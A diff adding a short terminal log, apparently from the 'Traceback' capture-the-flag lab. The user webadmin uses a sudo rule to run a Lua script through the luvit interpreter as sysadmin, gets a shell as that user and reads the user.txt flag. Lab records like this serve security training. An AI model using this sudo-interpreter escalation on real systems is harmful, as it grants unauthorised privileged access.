@@ -1,0 +1,21 @@
+[sudo] password for webadmin:     
+webadmin@traceback:~$ sudo - sysadmin /home/sysadmin/luvit priv.lua                                                                        
+[sudo] password for webadmin:     
+webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit priv.lua                                                                       
+sysadmin@traceback:~$ id          
+uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)          
+sysadmin@traceback:~$ ls          
+note.txt  priv.lua                
+sysadmin@traceback:~$ pwd         
+/home/webadmin                    
+sysadmin@traceback:~$ cd ~        
+sysadmin@traceback:~$ ls          
+note.txt  priv.lua                
+sysadmin@traceback:~$ cd /home/   
+sysadmin/ webadmin/               
+sysadmin@traceback:~$ cd /home/sysadmin/                             
+sysadmin@traceback:/home/sysadmin$ ls                                
+luvit  user.txt                   
+sysadmin@traceback:/home/sysadmin$ cat user.txt                      
+c456c3be43e573b749d08efa0b9b1155  
+sysadmin@traceback:/home/sysadmin$                                   
